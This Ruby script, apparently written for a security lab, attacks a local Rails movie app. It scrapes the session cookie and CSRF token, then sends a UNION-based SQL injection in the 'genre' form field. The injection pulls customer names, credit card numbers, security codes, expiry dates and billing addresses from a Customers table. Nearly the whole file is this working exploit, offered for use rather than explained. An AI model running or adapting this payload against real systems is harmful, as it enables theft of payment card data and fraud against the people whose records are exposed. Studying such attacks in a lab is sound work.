require 'socket'
require 'cgi'


def getBadPage
	# Set up the socket.
	socket = TCPSocket.open("localhost", 3000)

	# Create the HTTP header. Set all the fields
	get_req = "GET /movies/selectGenre HTTP/1.0" + "\r\n"
	get_req += "Host: localhost:3000\r\n"
	get_req += "Accept: text/xml,application/xml,application/xhtml+xml,text/html*/*" + "\r\n"
	get_req += "Accept-Language: en-us" + "\r\n"
	get_req += "Accept-Charset: iso-8859-1,*,utf-8" + "\r\n"
	get_req += "Connection: close\r\n\r\n"

	# Put the data into the socket
	socket.puts get_req

	#escaped_token = CGI.escape(token)
	return socket

end

def postRequest(data)

	formData = "utf8=%E2%9C%93&"
	formData += "authenticity_token=" + CGI.escape(data[:authenticity_token])
	formData += "&genre=" + data[:genre] #CGI.escape(data[:genre])
	formData += "&commit=Show+Movies"


	socket = TCPSocket.open("localhost", 3000)	

	# Create the HTTP header. Set all the fields
	post_req = "POST /movies/showGenre HTTP/1.0" + "\r\n"
	post_req += "Host: localhost:3000\r\n"
	post_req += "Accept: text/xml,application/xml,application/xhtml+xml,text/html*/*" + "\r\n"
	post_req += "Accept-Language: en-us" + "\r\n"
	post_req += "Accept-Charset: iso-8859-1,*,utf-8" + "\r\n"
	post_req += "Content-Type: application/x-www-form-urlencoded" + "\r\n"

	post_req += "Content-Length: #{formData.length}" +"\r\n"
	post_req += "Cookie: _session_id=#{data[:cookie]}" + "\r\n"
	post_req += "Connection: close\r\n\r\n"
	

	# puts data[:cookie]

	post_req += formData

	puts formData

	socket.puts post_req 

	return socket

	

end

def retrieveCookie(line)

	regex = Regexp.new(/Set-Cookie: _session_id=(.*?);/m)
	cookie = regex.match(line)

	if cookie then
		return cookie[1].strip
	end

	return nil

end

def retrieveAuth(line)

	regex = Regexp.new(/(.*)<input name="authenticity_token" type="hidden" value="(.*?)"/m)
	auth = regex.match(line)

	if auth then
		return auth[2].strip
	end

	return nil

end



def print_to_file(socket)
	fh = File.open("response_body.txt", 'w')
	fhead = File.open("response_header.txt", 'w') 

	is_html_doc = false

	# Regex expression to match the beginning of the HTML doc
	regexHTML = Regexp.new(/<?xml.*?/)

	authToken = nil
	cookie = nil


	while(line=socket.gets) do
		matchHTML = regexHTML.match(line)



		if matchHTML
			is_html_doc = true
		end

		if is_html_doc

			token = retrieveAuth(line)

			if token then
				authToken = token
			end

			fh.write(line)

		else

			token = retrieveCookie(line)
			if token then
				cookie = token
			end

			fhead.write(line)

		end


	end

	formData = Hash.new()
	formData[:authenticity_token] = authToken
	formData[:cookie] = cookie
	formData[:genre] = "'and 1=0 union select c.name as title, c.card_number as director, c.security_code as star, c.exp_month as release_year, c.exp_year as genre, c.billing_street as rating, c.name as id from Customers c where '1'='1"
	# , card_num as director, security_code as star, exp_month as genre, exp_year as release_year FROM Customers"

	return formData

end

def print_post_request(socket)
	
	fh = File.open("post_response_body.html", 'w')
	fhead = File.open("post_response_header.txt", 'w') 

	is_html_doc = false

	# Regex expression to match the beginning of the HTML doc
	regexHTML = Regexp.new(/<?xml.*?/)
	regexTD = Regexp.new(/(.*)>(.*?)<(.*)/m)

	while(line=socket.gets) do
		matchHTML = regexHTML.match(line)

		if matchHTML
			is_html_doc = true
		end

		if is_html_doc

			l = regexTD.match(line)
			puts l
			# puts regexTD.match(line)[1]
			fh.write(line)

		else

			fhead.write(line)

		end

	end


end

getSocket = getBadPage()
data = print_to_file(getSocket)

postSocket = postRequest(data)
print_post_request(postSocket)


